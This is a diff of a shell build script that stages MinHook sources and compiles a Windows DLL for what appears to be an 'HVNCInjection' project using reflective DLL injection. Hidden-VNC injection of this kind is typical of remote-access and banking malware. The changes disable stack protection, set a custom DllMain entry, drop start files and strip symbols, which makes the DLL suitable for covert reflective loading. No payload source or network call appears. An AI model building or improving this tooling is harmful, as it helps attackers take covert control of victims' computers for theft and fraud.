@@ -36,6 +36,7 @@ MINHOOK_DIR="$SRC_DIR/minhook"
 
 stage_minhook_tree() {
   local source_root="$1"
+  local include_root="${2:-$1}"
 
   mkdir -p "$MINHOOK_DIR/hde"
   cp -f "$source_root/buffer.c" "$MINHOOK_DIR/" 2>/dev/null || true
@@ -55,22 +56,37 @@ stage_minhook_tree() {
   if [ -f "$source_root/MinHook.h" ]; then
     cp -f "$source_root/MinHook.h" "$MINHOOK_DIR/MinHook.h" 2>/dev/null || true
     cp -f "$source_root/MinHook.h" "$SRC_DIR/include/MinHook.h" 2>/dev/null || true
+  elif [ -f "$include_root/MinHook.h" ]; then
+    cp -f "$include_root/MinHook.h" "$MINHOOK_DIR/MinHook.h" 2>/dev/null || true
+    cp -f "$include_root/MinHook.h" "$SRC_DIR/include/MinHook.h" 2>/dev/null || true
   fi
 }
 
 stage_minhook_from_static_dir() {
-  local candidate=""
+  local candidate_src=""
+  local candidate_include=""
 
   for dir in "$MINHOOK_STATIC_DIR" "HVNCInjection/Minhook" "HVNCInjection/minhook"; do
     if [ -f "$dir/hook.c" ] && [ -f "$dir/hde/hde64.c" ]; then
-      candidate="$dir"
+      candidate_src="$dir"
+      candidate_include="$dir"
+      break
+    fi
+
+    if [ -f "$dir/src/hook.c" ] && [ -f "$dir/src/hde/hde64.c" ]; then
+      candidate_src="$dir/src"
+      if [ -f "$dir/include/MinHook.h" ]; then
+        candidate_include="$dir/include"
+      else
+        candidate_include="$dir/src"
+      fi
       break
     fi
   done
 
-  if [ -n "$candidate" ]; then
-    echo "Using static MinHook source from $candidate"
-    stage_minhook_tree "$candidate"
+  if [ -n "$candidate_src" ]; then
+    echo "Using static MinHook source from $candidate_src"
+    stage_minhook_tree "$candidate_src" "$candidate_include"
     return 0
   fi
 
@@ -103,7 +119,7 @@ fetch_minhook() {
     return 1
   fi
 
-  stage_minhook_tree "$tmpdir/minhook/src"
+  stage_minhook_tree "$tmpdir/minhook/src" "$tmpdir/minhook/include"
   cp -f "$tmpdir/minhook/include/MinHook.h" "$MINHOOK_DIR/MinHook.h" 2>/dev/null || true
   mkdir -p "$SRC_DIR/include"
   cp -f "$tmpdir/minhook/include/MinHook.h" "$SRC_DIR/include/MinHook.h" 2>/dev/null || true
@@ -150,7 +166,7 @@ if [ -d "$MINHOOK_DIR" ] && { [ -f "$MINHOOK_DIR/hook.c" ] || [ -f "$MINHOOK_DIR
              "$MINHOOK_DIR"/hook.c "$MINHOOK_DIR"/MinHook.c; do
     if [ -f "$src" ]; then
       obj="${src%.c}.o"
-      "$CC" -c -O2 -DWIN64 -D_WIN64 $MINHOOK_INC -o "$obj" "$src"
+      "$CC" -c -O2 -DWIN64 -D_WIN64 -fno-stack-protector -fno-asynchronous-unwind-tables $MINHOOK_INC -o "$obj" "$src"
       MINHOOK_OBJS="$MINHOOK_OBJS $obj"
     fi
   done
@@ -170,6 +186,8 @@ CFLAGS="-O2 -DWIN64 -D_WIN64 -DNDEBUG -D_WINDOWS -D_USRDLL"
 CFLAGS="$CFLAGS -DHVNCInjection_EXPORTS -DWIN_X64"
 CFLAGS="$CFLAGS -DREFLECTIVEDLLINJECTION_VIA_LOADREMOTELIBRARYR"
 CFLAGS="$CFLAGS -DREFLECTIVEDLLINJECTION_CUSTOM_DLLMAIN"
+CFLAGS="$CFLAGS -fno-stack-protector"
+CFLAGS="$CFLAGS -fno-asynchronous-unwind-tables"
 CFLAGS="$CFLAGS -I$SRC_DIR"
 if [ -n "${MINHOOK_INC:-}" ]; then
   CFLAGS="$CFLAGS $MINHOOK_INC"
@@ -194,8 +212,11 @@ if [ -n "${MINHOOK_LIB:-}" ] && [ -f "${MINHOOK_LIB}" ]; then
   LINK_LIBS="$LINK_LIBS $MINHOOK_LIB"
 fi
 
-"$CC" -shared -o "$OUT_DIR/$DLL_NAME" $LINK_OBJS $LINK_LIBS \
-  -Wl,--no-seh -s
+"$CC" -shared -nostartfiles -o "$OUT_DIR/$DLL_NAME" $LINK_OBJS $LINK_LIBS \
+  -Wl,--entry,DllMain \
+  -Wl,--no-seh \
+  -fno-stack-protector \
+  -s
 
 echo "Built: $OUT_DIR/$DLL_NAME"
 ls -la "$OUT_DIR/$DLL_NAME"
